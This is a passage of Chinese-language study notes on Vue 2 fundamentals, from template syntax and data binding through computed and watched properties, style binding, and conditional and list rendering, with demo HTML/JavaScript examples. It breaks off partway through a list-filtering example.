## 1.1 Vue简介

### 1.1.1 介绍与描述

- `Vue`是一套用来动态构建用户界面的**渐进式**`JavaScript`框架
  - 构建用户界面: 把数据通过某种方法变成用户界面
  - 渐进式: `Vue`可以自底向上逐层地应用, 简单应用只需要一个轻量小巧的核心库, 复杂应用可以引入各式各样的`Vue`

### 1.1.2 Vue的特点

1. 遵循`MVVM`模式
2. 编码简洁, 体积小, 运行效率高, 适合移动/PC端开发
3. 它本身只关注UI, 可以引入其它第三方库开发项目
4. 采用**组件化**模式, 提高代码复用率, 且让代码更好维护
5. 声明式编码, 让编码人员无需直接操作`DOM`, 提高开发效率
   * 使用虚拟`DOM`和`Diff`算法, 尽量复用`DOM`节点 

### 1.1.3 Vue周边库

* vue-cli: vue脚手架
* vue-resource(axios): ajax请求
* vue-router: 路由
* vuex: 状态管理(它是vue的插件但没有用vue-xxx的命名规则)
* vue-lazyload: 图片懒加载
* vue-scroller: 页面滑动相关
* mint-ui: 基于vue的UI组件库(移动端)
* element-ui: 基于vue的UI组件库(PC端)

## 1.2 初始Vue

**前置工作**

1. 给浏览器安装`Vue Devtools`插件
2. 标签引入`Vue`包
3. 阻止`vue`在启动时生成生产提示`Vue.config.productionTip = false`
4. `favicon`需要将页签图标放在项目根路径, 重新刷新打开就有了(shfit+F5强制刷新)

**初始Vue**

1. 想让`vue`工作, 就必须创建一个`Vue实例`, 且要传入一个配置对象

2. root容器里的代码依旧符合`html规范`, 只不过混入了一些特殊的`vue语法`

3. root容器里的代码被称为`vue模板`

4. vue实例与容器是**一 一对应**的

5. 真实开发中只有一个`vue实例`, 并且会配合着组件一起使用

6. `{{xxx}}`中的xxx要写`js表达式`, 且xxx可以自动读取到`data`中的所有属性

   **注意区分**: js表达式和js代码(语句)

   1. 表达式: 一个表达式会产生产生一个值, 可以放在任何一个需要值的地方(`a`, `a+b`, `demo(1)`, `x===y?'a':'b'`)

   2. js代码(语句)

      if(){}, for(){}

7. 一旦`data`中的数据发生变化, 那么模板中用到该数据的地方也会自动更新

   ```javascript
   <!DOCTYPE html>
   <html>
     <head>
       <meta charset="UTF-8" />
       <title>初识Vue</title>
       <!-- 引入Vue -->
       <script type="text/javascript" src="../js/vue.js"></script>
     </head>
     <body>
       <!-- 准备好一个容器 -->
       <div id="demo">
         <h1>Hello，{{ name.toUpperCase() }}，{{ address }}</h1>
       </div>
   
       <script type="text/javascript" >
         Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
   
         // 创建Vue实例
         new Vue({
           el: '#demo', // el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串
           data: {	// data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象
             name: 'cess',
             address: '成都'
           }
         })
       </script>
     </body>
   </html>
   ```

## 1.3 模板语法

`Vue`模板语法包括两大类

1. 插值语法

   功能: 用于解析标签体内容

   写法: `{{xxx}}`, xxx是**js表达式**, 可以直接读取到data中的所有区域

2. 指令语法

   功能: 用于解析标签(包括: 标签属性, 标签体内容, 绑定事件)

   举例: `<a v-bind:href="xxx">`或简写为`<a :href="xxx">`, xxx同样要写**js表达式**, 可以直接读取到data中所有属性

   备注:`vue`中有很多指令, 且形式都是`v-xxx`, 此处知识拿`v-bind`举例

```javascript
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
  </head>
  <body>
    <div id="root">
      <h2>插值语法</h2>
      <h4>你好，{{ name }}</h4>
      <hr />
      <h2>指令语法</h2>
      <a v-bind:href="tencent.url.toUpperCase()" x="hello">点我去看{{ tencent.name }}1</a>
      <a :href="tencent.url" x="hello">点我去看{{ tencent.name }}2</a>
    </div>
  </body>

  <script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    new Vue({
      el: '#root',
      data: {
        name: 'jack',
        tencent: {
          name: '开端',
          url: 'https://v.qq.com/x/cover/mzc00200mp8vo9b/n0041aa087e.html',
        }
      }
    })
  </script>
</html>
```

## 1.4 数据绑定

`Vue`中有2种**数据绑定**的方式

1. 单向绑定`v-bind`数据只能从data流向页面
2. 双向绑定`v-model`数据不仅能从data流向页面, 还可以从页面流向data

**备注**

1. 双向绑定一般都应用在**表单类元素**上, 如`<input> <select> <textarea>`等
2. `v-model:value`可以简写为`v-model`, 因为`v-model`默认收集的就是`value`的值

```
<body>
    <!-- 普通写法 -->
    <!-- <div id="root">
        单向数据绑定: <input type="text" v-bind:value="name"><br>
        双向数据绑定: <input type="text" v-model:value="name"><br>
    </div> -->
    
    <!-- 简写 -->
    <div id="root">
        单向数据绑定: <input type="text" :value="name"><br>
        双向数据绑定: <input type="text" v-model="name"><br>
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    new Vue({
        el:'#root',
        data:{
            name:'cess' 
        }
    })
</script>
```

## 1.5 el与data的两种写法

`el`有2种写法

1. 创建`Vue`实例对象的时候配置`el`属性
2. 先创建`vue`实例, 随后再通过`vm.$mount('#root')`指定`el`的值

`data`有2种写法

1. 对象式: `data: {}`
2. 函数式: `data() {return{}}`

​	如何选择: 目前哪种写法都可以, 以后到组件时, `data`必须使用函数, 否则会报错

**一个重要原则**

​	由`vue`管理的函数, **一定不要写箭头函数**, 否则**this**就不再是`vue实例`了

```javascript
<body>
    <div id="root">
        <h1>你好，{{name}}</h1>
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    // const vm = new Vue({
    //     el:'#root', // 第一种写法
    //     data:{
    //         name:'cess'
    //     }
    // })
    // console.log(vm);
    // vm.$mount('#root'); // 第二种写法

    // data的两种写法
    new Vue({
        el:'#root',
        // data的第一种写法: 对象式
        // data:{
        //     name:'cess'
        // }

        // data第二种写法: 函数式
        data() {
            console.log('@@@', this); // 此处this是Vue实例对象
            return {
                name: 'cess'
            }
        }
    })
</script>
```

## 1.6 MVVM模型

`MVVM`模型

* M: 模型**Model**, `data`种的数据
* V: 视图**View**, 模板代码
* VM: 视图模型**ViewModel**, `Vue实例`

观察发现

* `data`中所有的属性, 最后都出现`vm`身上
* `vm`身上所有的属性及`Vue原型`身上所有的属性, 在`Vue模板`中都可以直接使用

```javascript
<body>
    <div id="root">
        <h2>名称: {{name}}</h2>
        <h2>战队: {{rank}}</h2>
        <h2>测试: {{$options}}</h2>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            name:'uzi',
            rank:'RNG'
        }
    })
</script>
```

## 1.7 Vue中的数据代理

**回顾Object.defineproperty**方法

```javascript
<script>
    let number = 18;
    let person = {
        name:'张三',
        sex:'男',
    }

    // 参数: (待添加的参数, 添加的属性名, 配置项)
    Object.defineProperty(person, 'age', {
        // value:18,
        // enumerable:true, // 控制属性是否可以枚举，默认值是false
        // writable:true, // 控制属性是否可以被修改，默认值是false
        // configurable:true, // 控制属性是否可以被删除，默认值是false
    
        // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
        get() {
            console.log("有人读取age属性了");
            return number;
        },
        
        // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
        set(value) {
            console.log("有人修改了age属性, 且值是", value);
            number = value;
        }
    })
    console.log(Object.keys(person));
    console.log(person);
</script>
```

**数据代理**: 通过一个对象代理对另一个对象中属性的操作(读/写)

```javascript
<script>
    let obj = {x:100};
    let obj2 = {y:200};

    Object.defineProperty(obj2, 'x', {
        get() {
            return obj.x;
        },
        set(value) {
            obj.x = value 
        }
    })
</script>
```

1. `Vue`中的数据代理通过`vm`对象来代理`data`对象中属性的操作(读/写)
2. `Vue`中数据代理的好处: 更加方便的操作`data`中的数据
3. 基本原理
   1. 通过`object.defineProperty()`把data对象中所有属性添加到`vm`上
   2. 为每一个添加到`vm`上的属性, 都指定一个`getter setter`
   3. 在`getter` `setter`内部去操作(读/写)`data`中对象的属性

![image-20220507111015634](C:\Users\W-208 枼\AppData\Roaming\Typora\typora-user-images\image-20220507111015634.png)

`Vue`将`data`中的数据拷贝了一份到`_data`属性中, 又将`_data`里面的属性提到`Vue实例`中(如name), 通过`defineProperty`实现数据代理, 这样通过`getter/setter`操作name, 进而操作`_data`中的name. 而`_data`又对`data`进行数据劫持, 实现响应式.

```javascript
<body>
	<div id="root">
        <h2>学校名称：{{name}}</h2>
        <h2>学校地址：{{address}}</h2>
    </div>
</body>
<script>
    Vue.config.productionTip = false;

    const vm = new Vue({
        el:'#root',
        data:{ // 只有data中的属性才进行数据代理和数据劫持
            name:'尚硅谷',
            address:'宏福科技园'
        }
    });
</script>
```

## 1.8 事件处理

### 1.8.1 事件的基本用法

1. 使用`v-on:xxx`或`@xxx`绑定事件, 其中xxx是事件名
2. 事件的回调需要配置在methods对象中, 最终会在`vm`上
3. `methods`中配置的函数, **不要用箭头函数**, 否则**this**就不是`vm`了
4. `methods`中配置的函数, 都是别`vue`所管理的函数, **this**的指向是`vm`或`组件实例对象`
5. `@click="demo"`和`@click="demo($event)"`效果一致, 但后者可以传参

```javascript
<body>
	<div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <button v-on:click="showInfo">点我提示信息</button> -->
        <button @click="showInfo1">点我提示信息1（传参）</button>
        <button @click="showInfo2($event,66)">点我提示信息2（不传参）</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    
    new Vue({
        el:"#root",
        data:{
            name:'尚硅谷'
        },
        methods:{
            showInfo1(event){
                // console.log(event.target.innerText);
                // console.log(this); // 此处的this是vm
                alert("同学你好!")
            },
            showInfo2(event, number){
                console.log(event, number);
                // console.log(event.target.innerText);
                // console.log(this); // 此处的this是vm
                alert("同学你好!!")
            }
        }
    })
</script>
```

### 1.8.2 事件修饰符

`Vue`中的事件修饰符

1. `prevent`	阻止默认事件(常用)
2. `stop`：阻止事件冒泡（常用）
3. `once`：事件只触发一次（常用）
4. `capture`：使用事件的捕获模式
5. `self`：只有`event.target`是当前操作的元素时才触发事件
6. `passive`：事件的默认行为立即执行，无需等待事件回调执行完毕

修饰符可以连写, 且谁在前就先执行谁, 如: `@click.prevent.stop="showInfo"`

```javascript
<body>
	<div id="root">
        <h2>欢迎来到{{name}}学习</h2>
       
        <!-- 阻止默认事件（常用） -->
        <!-- 阻止了点击a标签之后的默认跳转事件 -->
        <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>
       
        <!-- 阻止事件冒泡（常用） -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">点我提示信息</button>
            <!-- 修饰符可以连写, 且谁在前就先执行谁 -->
            <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
        </div>
        
        <!-- 事件只触发一次（常用） -->
        <button @click.once="showInfo">点我提示信息</button>

        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>
       
        <!-- 只有event.target是当前操作的元素时才触发事件, 也可以用来阻止冒泡 -->
       <div class="demo1" @click.self="showInfo">
           <button @click="showInfo">点我提示信息</button>
       </div>
       
       <!-- 事件的默认行为立即执行,无需等待事件回调执行完毕 -->
       <!-- scroll: 滚动条滚动, passive没有影响 -->
       <!-- whell: 鼠标滚轮滚动, passive有影响 -->
       <ul @wheel.passive="demo" class="list">
           <li>1</li>
           <li>2</li>
           <li>3</li>
           <li>4</li>
       </ul>
    </div>
</body>
<script>
    Vue.config.productionTip = false; 

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        },
        methods:{
            showInfo(e) {
                // 手动API阻止事件
                // e.preventDefault(); // 阻止默认行为
                // e.stopPropagation(); // 阻止事件冒泡
                
                alert("同学你好！");
                console.log(e.target);
            },
            showMsg(msg) {
                console.log(msg);
            },
            demo() {
                for (let i = 0; i < 10000; ++i) {
                    console.log('#');
                }
                console.log("累坏了");
            }
        }
    })
</script>
```

### 1.8.3 键盘事件

> 键盘上的每个按键都有自己的名称和编码, 例如: Enter(13). 而`vue`还对一些常用按键起了别名方便使用

1. Vue中常用的按键别名:

   回车 => enter

   删除 => delete (捕获"删除"和"退格"键")

   退出 => esc

   空格 => space

   换行`tab`特殊, 它本身就有切换焦点的功能, 所以必须配合`keydown`去使用

   上 => up

   下 => down

   左 => left

   右 => right

2. `Vue`未提供别名的按键, 可以使用按键原始的`key`值去绑定,但注意要转为`kebab-case`(多单词小写, 短横线命名)

3. 系统修饰键(用法特殊): `ctrl, alt, shift, meta(meta就是win键)`

   1. 配合`keyup`使用: 按下修饰键的同时, 再按下其他键, 随后释放其他键, 事件才被触发

      如: 指定ctrl + y使用  `@keyup.ctrl.y`

   2. 配合`keydown`使用: 正常触发事件

4. 也可以使用keyCode去指定具体的按键(**不推荐**, 因为不同键盘之间的键位编码可能不同)

5. `Vue.config.keyCodes 自定义键名 = 键码`, 可以去定制按键别名(**不推荐**)

```javascript
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- @keydown.ctrl.y 表示只能通过按下ctrl和y才可以触发事件,其他按键组合不可以 -->
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo"><br>
        <input type="text" placeholder="按下tab提示输入" @keydown.tab="showInfo"><br>
        <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo"><br>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    Vue.config.keyCodes.huiche = 13; // 定义了一个别名按键

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷'
        },
        methods:{
            showInfo(e) {
                // if (e.keyCode !== 13) return ;
                // console.log(e.key, e.keyCode);
                console.log(e.target.value);
            }
        }
    })
</script>
```

## 1.9 计算属性

**姓名案例不同实现**

1. 插值语法

   ```javascript
   <div id="root">
       姓: <input type="text" v-model="firstName"><br>
       名: <input type="text" v-model="lastName"><br>
       全名: <span>{{firstName}}-{{lastName}}</span>
   </div>
   <script>
       Vue.config.productionTip = false;
       new Vue({
           el:'#root',
           data:{
               firstName:'张',
               lastName:'三'
           }
       })
   </script>
   ```

2. `method`实现

   数据发生变化, 模板就会被重新解析

   ```javascript
   <div id="root">
       姓: <input type="text" v-model="firstName"><br>
       名: <input type="text" v-model="lastName"><br>
       全名: <span>{{fullName()}}</span>
   </div>
   <script>
       Vue.config.productionTip = false;
       new Vue({
           el:'#root',
           data:{
               firstName:'张',
               lastName:'三'
           },
           methods:{
               fullName() {
                   return this.firstName + '-' + this.lastName;
               }
           }
       })
   </script>
   ```

3. **`computed`计算属性**

   1. 定义: 要用的属性不存在, 需要通过已有属性计算得来
   2. 原理: 底层借助了`Object.defineproperty()`方法提供的`gettter`和`setter`
   3. `get`函数什么时候执行?
      1. 初次读取时会执行一次
      2. 当依赖的数据发生改变时, 会被再次调用
   4. 优点: 与`methods`实现相比, **内部有缓存机制**(复用), 效率更高, 调试方便
   5. 备注:
      1. 计算属性最终会出现在vm上, 直接读取使用即可
      2. 如果计算属性要被修改, 那必须写set函数去响应修改, 且set中要引起计算式依赖的数据发生改变
      3. 如果计算属性确定不考虑修改, 可以使用计算属性的简写形式

   ```javascript
   <div id="root">
       姓：<input type="text" v-model="firstName"><br>
       名：<input type="text" v-model="lastName"><br>
       测试: <input type="text" v-model="x"><br> //这里修改不会调用fullName的get方法
       全名：<span>{{fullName}}</span><br>
       全名：<span>{{fullName}}</span><br>
       全名：<span>{{fullName}}</span><br>
       全名：<span>{{fullName}}</span><br>
   </div>
   <script>
       Vue.config.productionTip = false;
       const vm = new Vue({
           el:'#root',
           data:{ // data中都是属性
               firstName:'张',
               lastName:'三',
           },
           computed:{
               // 完整写法
               // fullName:{
               //     // 当读取fullName时，get就会调用，且返回值为fullName的值
               //     get() {
               //         console.log("get被调用了");
               //         return this.firstName + '-' + this.lastName;
               //     },
               //	   // 当fullName被修改时调用
               //     set(value){
               //         console.log("set:" + value);
               //         const arr = value.split('-');
               //         this.firstName = arr[0];
               //         this.lastName = arr[1]; 
               //     }
               // }
               // 简写
               fullName(){
                   console.log("get被调用了");
                   return this.firstName + '-' + this.lastName;
               }
           }
       })
   </script>
   ```

   ## 1.10 监视属性(侦听属性)
   
   **天气案例**
   
   ```javascript
   <div id="root">
       <h2>今天天气很{{info}}</h2>
       <!-- 绑定事件时: @xxx="yyy" yyy可以写一些简单的语句 -->
       <!-- <button @click="isHot = !isHot">切换天气</button> -->
       <button @click="changeWeather">切换天气</button>
   </div>
   <script>
       Vue.config.productionTip = false;
   
       new Vue({
           el:'#root',
           data:{
               isHot:'true'
           },
           computed: { // 计算属性
               info() {
                   return this.isHot ? '炎热' : '凉爽';
               }
           },
           methods: {
               changeWeather() {
                   this.isHot = !this.isHot;
               }
           }
       })
   </script>
   ```
   
   

### 1.10.1 监视属性基本用法

`watch`监视属性

1. 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
2. 监视的属性必须存在, 才能进行监视, 既可以监视`data`, 也可以监视计算属性
3. 配置项属性`immediate:false`, 改为`true`, 则初始化时调用一次, `handler(newValue, oldValue)`
4. 监视有两种写法
   1. 创建`Vue`时传入`watch:{}`配置
   2. 通过`vm.$watch()`监视 (参数: `监视的对象`(**注意要写字符串**), `配置对象`)

```javascript
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <!-- 绑定事件时: @xxx="yyy" yyy可以写一些简单的语句 -->
    <!-- <button @click="isHot = !isHot">切换天气</button> -->
    <button @click="changeWeather">切换天气</button>
</div>
<script>
    Vue.config.productionTip = false;

    const vm = new Vue({
        el:'#root',
        data:{
            isHot:true
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot;
            }
        },
        // watch: {
        //     isHot: {
        //         immediate:true, // 初始化时调用handler
        //         // 当isHot发生改变时调用
        //         handler(newValue, oldValue) {
        //             console.log("isHot被修改了", newValue, oldValue);
        //         }
        //     }
        // }
    })
    vm.$watch('isHot', {
        immediate:true,
        handler(newValue, oldValue) {
            console.log('isHot被修改了', newValue, oldValue);
        }
    });
</script>
```

### 1.10.2 深度监视

1. `Vue`中的`watch`默认不监视对象内部值的改变(第一层)
2. 在`watch`中配置`deep:true`可以检测对象内部值的改变(多层)

注意:

1. `Vue`自身可以监视对象内部值的改变, 但`Vue`提供的`watch`默认不可以
2. 使用`watch`时根据监视数据的具体结构, 决定是否采用深度监视

```javascript
<div id="root">
    <h3>a的值是:{{numbers.a}}</h3>
    <button @click="numbers.a++">点我让a++</button>
    <h3>b的值是:{{numbers.b}}</h3>
    <button @click="numbers.b++">点我让b++</button>

    <button @click="numbers = {a:666, b:888}">彻底替换掉numbers</button>
    {{numbers.c.d.e}}
</div>
<script>
    Vue.config.productionTip = false;

    const vm = new Vue({
        el:'#root',
        data:{
            isHot:'true',
            numbers:{
                a:1,
                b:1,
                c:{
                    d:{
                        e:100
                    }
                }
            }
        },
        watch: {
            // 监视多级结构中某个属性的变化
            // 'numbers.a':{
            //     handler(){
            //         console.log('a被改变了')
            //     }
            // }
            
            // 监视多级结构中所有属性的变化
            numbers: {
                deep: true,
                handler(){
                    console.log("number被改变了")
                }
            }
        }
    })
</script>
```

### 1.10.3 监视属性简写

如果监视属性除了`handler`没有其他配置项(`immediate, deep...`)的话, 可以进行简写

```javascript
<div id="root">
    <h2>今天天气很{{info}}</h2>
    <button @click="changeWeather">切换天气</button>
</div>
<script>
    Vue.config.productionTip = false;

    const vm = new Vue({
        el:'#root',
        data:{
            isHot:'true'
        },
        computed: {
            info() {
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        methods: {
            changeWeather() {
                this.isHot = !this.isHot;
            }
        },
        watch: {
            // 正常写法
            // isHot: {
            //     // immediate:true, // 初始化时调用handler
            //     // deep:true, // 深度监视
            //     // 当isHot发生改变时调用
            //     handler(newValue, oldValue) {
            //         console.log("isHot被修改了", newValue, oldValue);
            //     }
            // },
            // 简写
            // isHot(newValue, oldValue) {
            //     console.log('isHot被修改了', newValue, oldValue);
            // }
        }
    })

    // 正常写法
    // vm.$watch('isHot', {
    //     immediate:true, // 初始化时调用handler
    //     deep:true, // 深度监视
    //     handler(newValue, oldValue) {
    //         console.log('isHot被修改了', newValue, oldValue);
    //     }
    // });

    // 简写
    vm.$watch('isHot', function(newValue, oldValue) {
        console.log('isHot被修改了', newValue, oldValue);
    })
</script>
```

### 1.10.4 计算属性 VS 监听属性

`computed`和`watch`之间的区别

* `computed`能完成的功能, watch都可以完成
* `watch`能完成的功能, `computed`不一定能完成, 例如`watch`可以进行异步操作

两个重要原则

* 所有被`Vue`管理的函数, 最好写成普通函数, 这样`this`的指向才是`vm`或`组件实例对象`
* 所有不被`Vue`管理的函数, (定时器的回调函数, ajax的回调函数, Promise的回调函数), 最好写成箭头函数, 这样`this`的指向才是`vm`或`组件实例对象`

**计算属性实现姓名案例**

```javascript
<div id="root">
    姓: <input type="text" v-model="firstName"><br>
    名: <input type="text" v-model="lastName"><br>
    全名: <span>{{fullName}}</span><br>
</div>
<script>
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
        },
        computed:{
            // 简写
            fullName(){
                console.log("get被调用了");
                return this.firstName + '-' + this.lastName;
            }
        }
    })
</script>
```

**监听属性实现姓名案例**

```javascript
<script>
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:'#root',
        data:{
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },
        watch:{
            firstName(val){
                setTimeout(() => { // 开启异步任务
                    // console.log(this); // 此处指向vm
                    this.fullName = val + '-' + this.lastName;
                }, 1000);
            },
            lastName(val){
                this.fullName = this.firstName + '-' + val;
            }
        }
    })
</script>
```

## 1.11 绑定样式

1. class样式
   1. 写法:`class="xxx"`,  xxx可以是字符串, 对象, 数组
   2. 字符串写法适用于: 类名不确定, 要动态获取.  
   3. 对象写法适用于: 要绑定多个样式, 个数不确定, 名字也不确定  
   4. 数组写法适用于: 要绑定多个样式, 个数确定, 名字也确定, 但不确定用不用.
2. style样式  
   1. :style="{fontSize:xxx}", 其中xxx是动态值  
   2. :style="[a,b]"其中a, b是样式对象

```javascript
<div id="root">
    <!-- 绑定class样式--字符串写法, 适用于: 样式的类名不确定, 需要动态指定 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
    <br>
    <!-- 绑定class--数组写法, 适用于: 要绑定的样式个数不确定,名字也不确定 -->
    <div class="basic" :class="classArr">{{name}}</div>
    <br>
    <!-- 绑定class--对象写法, 适用于: 要绑定的样式个数确定,名字也确定, 但要动态决定用不用 -->
    <div class="basic" :class="classObj">{{name}}</div>
    <br>

    <!-- 绑定style样式--对象写法 -->
    <div class="basic" :style="styleObj">{{name}}</div>
    <br>
    <!-- 绑定style样式--数组写法 -->
    <div class="basic" :style="styleArr">{{name}}</div>

</div>
<script>
    Vue.config.productionTip = false;

    new Vue({
        el:'#root',
        data:{
            name:"尚硅谷",
            mood:'normal',
            classArr:['atguigu1', 'atguigu2', 'atguigu3'],
            classObj:{
                atguigu1:true,
                atguigu2:true
            },
            styleObj:{
                fontSize:'40px',
                color:'red',
                backgroundColor:'orange'
            },
            styleObj2:{
                color:'blue',
                backgroundColor:'gray'
            },
            styleArr:[
                {
                    fontSize:'40px',
                    color:'red',
                    backgroundColor:'orange'
                },
                {
                    color:'blue',
                    backgroundColor:'gray'
                },
            ]
        },
        methods: {
            changeMood() {
                const arr = ['normal', 'happy', 'sad'];
                const index = Math.floor(Math.random()*3);
                this.mood = arr[index];
            }
        }
    })
</script>
```

## 1.12 条件渲染

`v-if`:

* 语法与if-else类似

  `v-if="表达式"`

  `v-else-if=表达式`

  `v-else`

* 适用于: 切换频率较低的场景

* 特点: 不展示的DOM元素直接被移除

* 注意: `v-if`可以和`v-else-if`, `v-else`一起使用,但要求结构不能被"打断"

`v-show`:

* 写法: `v-show="表达式"`
* 适用于: 切换频率较高的场景
* 特点: 不展示的DOM元素未被移除, 仅仅是使用样式隐藏掉

**备注**: 

1. 使用`v-if`时, 元素可能无法获取到, 而用`v-show`一定可以获取到
2. `template`标签不影响结构, 当`v-if`条件符合时, 显示页面中不会有此标签, 只能配合`v-if`, 不能配合`v-show`

```javascript
<div id="root">
    <h2>当前的n值是:{{n}}</h2>
    <button @click="n++">点我n+1</button>

    <!-- 使用v-show做条件渲染 -->
    <h2 v-show="false">欢迎来到{{name}}</h2>
    <h2 v-show="n === 1">欢迎来到{{name}}</h2>

    <!-- 使用v-if做条件渲染 -->
    <h2 v-if="false">欢迎来到{{name}}</h2>
    <h2 v-if="n === 1">欢迎来到{{name}}</h2>

    <!-- 使用v-else和v-else-if -->
    <div v-if="n === 1">Angular</div>
    <div v-else-if="n === 2">React</div>
    <div v-else-if="n === 3">Vue</div>
    <div v-else>哈哈</div>

    <!-- v-if与template配合使用  -->
    <template v-if="n === 1">
        <h2>你好</h2>
        <h2>尚硅谷</h2>
        <h2>北京</h2>
    </template>
</div>
<script>
    Vue.config.productionTip = false;

    new Vue({
        el:'#root',
        data:{
            name:'尚硅谷',
            n:0
        }
    })
</script>
```

## 1.13 列表渲染

### 1.13.1 基本列表

`v-for`指令

* 用于展示列表数据
* 语法: `<li v-for="(item, index) of items" :key="index">`, 这里`key`可以是`index`. 最好写成白能力对象的唯一标识(对象中的id)
* 可遍历: 数组(常见), 对象(常见), 字符串, 指定次数

```javascript
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表(遍历数组)</h2>
    <ul>
        <!-- <li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}</li> -->
        <li v-for="(p, index) in persons" :key="index">{{p.name}}-{{p.age}}</li>
    </ul>
    <!-- 遍历对象 -->
    <h2>汽车信息(遍历对象)</h2>
    <ul>
        <li v-for="(value, k) of car" :key="k">{{k}}-{{value}}</li>
    </ul>
    <!-- 遍历字符串 -->
    <h2>测试遍历字符串</h2>
    <ul>
        <li v-for="(char, k) of str" :key="k">{{k}}-{{char}}</li>
    </ul>
    <!-- 遍历指定次数 -->
    <h2>测试遍历指定次数</h2>
    <ul>
        <li v-for="(number, index) of 5" :key="index">{{index}}-{{number}}</li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false;

    new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001', name:'张三', age:18},
                {id:'002', name:'李四', age:19},
                {id:'003', name:'王五', age:20}
            ],
            car:{
                name:'奥迪A8',
                price:'70万',
                color:'黑色'
            },
            str:'hello'
        }
    })
</script>
```

### 1.13.2 key的作用和原理

<img src="C:\Users\W-208 枼\AppData\Roaming\Typora\typora-user-images\image-20220507205258401.png" alt="image-20220507205258401" style="zoom:50%;" />

<img src="C:\Users\W-208 枼\AppData\Roaming\Typora\typora-user-images\image-20220507205401373.png" alt="image-20220507205401373" style="zoom:50%;" />

**面试题:** `react/vue`中的`key`有什么作用? (`key`的内部原理)

1. `虚拟DOM`中`key`的作用: `key`是`虚拟DOM`中对象的标识, 当数据发生变化时, `Vue`会根据**新数据**生成**新的虚拟DOM**, 随后`Vue`进行**新的虚拟DOM** 与 **旧的虚拟DOM**的差异比较, 比较规则如下:
2. 对比规则
   1. 旧虚拟DOM中找到了新虚拟DOM相同的key
      1. 若`虚拟DOM`中内容没变, 直接使用之前的`真实DOM`
      1. 若`虚拟DOM`中内容变了, 则生成新的`真实DOM`, 随后替换掉页面中之前的`真实DOM`
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
      1. 创建新的真实DOM, 随后渲染到页面
3. 用`index`作为`key`可能会引发的问题
   1. 若对数据进行逆序添加, 逆序删除等**破坏顺序的操作**, 会产生没有必要的`真实DOM`更新 ==> 页面效果没问题, 但效率低
   2. 若结构中还包含**输入类的DOM**: 会产生错误DOM更新 ==> 界面有问题
4. 开发中如何选择`key`?
   1. 最好使用每条数据的**唯一标识作为key**, 比如id, 手机号, 身份证号, 学号等唯一值
   2. 如果不存在对数据的逆序添加, 逆序删除等破坏顺序的操作, 仅用于渲染列表, 使用`index`作为`key`是没有问题的

```javascript
<div id="root">
    <!-- 遍历数组 -->
    <h2>人员列表(遍历数组)</h2>
    <button @click.once="add">添加一个老刘</button>
    <ul>
        <li v-for="(p,index) of persons" :key="p.id">
            {{p.name}}-{{p.age}}
            <input type="text">
        </li>
    </ul>
</div>
<script>
    Vue.config.productionTip = false;
    
    new Vue({
        el:'#root',
        data:{
            persons:[
                {id:'001', name:'张三', age:18},
                {id:'002', name:'李四', age:19},
                {id:'003', name:'王五', age:20}
            ],
        },
        methods: {
            add() {
                const p = {id:'004', name:'老刘', age:21};
                this.persons.unshift(p);
            }
        }
    })
</script>
```

### 1.13.3 列表过滤

```javascript
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <ul>
    <li v-for="(p, index) in filPersons" :key="index">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false;
  // 用watch实现
  // #region
  // new Vue({
  //     el:'#root',
  //     data:{
  //         keyWord:'',
  //         persons:[
  //             {id:'001', name:'马冬梅', age:18, sex:'女'},
  //             {id:'002', name:'周冬雨', age:19, sex:'女'},
  //             {id:'003', name:'周杰伦', age:21, sex:'男'},
  //             {id:'004', name:'温兆伦', age:22, sex:'男'}
  //         ],
  //         filPersons:[]
  //     },
  //     watch:{
  //         keyWord:{
  //             immediate: true,
  //             handler(val) {
  //                 this.filPersons = this.persons.filter((p) => {
  //                     return p.name.indexOf(val) !== -1;
  //                 })
  //             }
  //         }
  //     }
  // })
  // #endregion

  // 用computed实现
  new Vue({
    el: '#root',
    data: {
      keyWord: '',
      persons: [
        {id:'001', name:'马冬梅', age:18, sex:'女'},
        {id:'002', name:'周冬雨', age:19, sex:'女'},
        {id:'003', name:'周杰伦', age:21, sex:'男'},
